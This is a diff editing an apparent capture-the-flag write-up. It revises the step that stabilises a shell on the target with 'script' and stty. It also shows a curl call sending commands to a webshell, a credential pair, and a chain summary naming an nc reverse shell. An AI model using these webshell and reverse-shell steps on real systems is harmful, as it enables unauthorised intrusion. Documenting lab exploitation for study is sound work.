@@ -116,9 +116,13 @@ PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote(
 curl -s "http://10.49.163.39:22/nnxhweOV/index.php?cmd=$PAYLOAD"
 ```
 
-No `python3` on the target, so the shell was stabilised with the stty method:
+`python3` was not present on the target, so `script` was used to spawn a PTY, followed by the standard stty upgrade on the attacker side:
 
 ```bash
+# On target — spawn PTY via script
+script /dev/null -c bash
+
+# On attacker — background and upgrade
 # Ctrl+Z
 stty raw -echo; fg
 stty rows 92 cols 104; export TERM='xterm'
@@ -196,6 +200,7 @@ ToDo:
     | POST jackinthebox:TplFxiSHjY → webshell at /nnxhweOV/index.php
     | ?cmd= → RCE as www-data
     | mkfifo + /bin/nc → reverse shell
+    | script /dev/null -c bash → PTY (no python3); stty raw -echo → stable shell
     v
 [www-data shell]
     |
